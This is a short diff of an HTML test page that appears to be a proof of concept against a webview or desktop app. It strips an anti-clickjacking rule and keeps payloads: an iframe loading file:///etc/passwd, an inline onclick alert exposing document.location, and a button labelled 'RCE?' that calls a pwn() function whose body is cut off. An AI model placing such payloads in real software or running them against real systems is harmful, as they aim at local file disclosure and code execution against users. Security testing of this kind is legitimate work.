@@ -1,6 +1,5 @@
-<style id="antiClickjack">body{display:none !important;}</style>
 <iframe src="file:///etc/passwd"></iframe>
-<a href="javascript:alert(document.location)">Location</a>
+<button onclick=alert(document.location)>Location</button>
 <button onclick=pwn()>RCE?</button>
 <script>
 	function pwn() {
